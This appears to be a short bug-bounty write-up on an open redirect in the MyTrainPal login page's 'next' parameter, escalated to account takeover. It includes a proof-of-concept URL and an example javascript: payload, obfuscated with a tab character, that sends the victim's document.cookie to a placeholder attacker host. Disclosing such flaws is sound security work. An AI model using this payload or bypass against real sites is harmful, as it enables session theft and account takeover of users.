---
title: "Open Redirect To Account TakeOver"
date: 2024-10-07 00:00:00 +0000
categories: [Bug Hunting]
tags: [bughunting, cybersecurity]
---

# Open Redirect To Account TakeOver

Today, I'm thrilled to share my adventure of discovering a critical flaw in the MyTrainPal website—an open redirect vulnerability that could potentially lead to account takeover.

**The Discovery:**
A vulnerability in the `next` parameter of the login URL.

**Proof of Concept (POC):**
`https://www.mytrainpal.com/signin?next=[MALICIOUS_WEBSITE]`

**The Exploitation:**
By injecting a JavaScript payload into the `next` parameter, I was able to steal cookies from a logged-in user.

**Example payload:**
`https://www.mytrainpal.com/signin?next=j%09avascript:document.location='http://{attackersite.com}/'+document.cookie`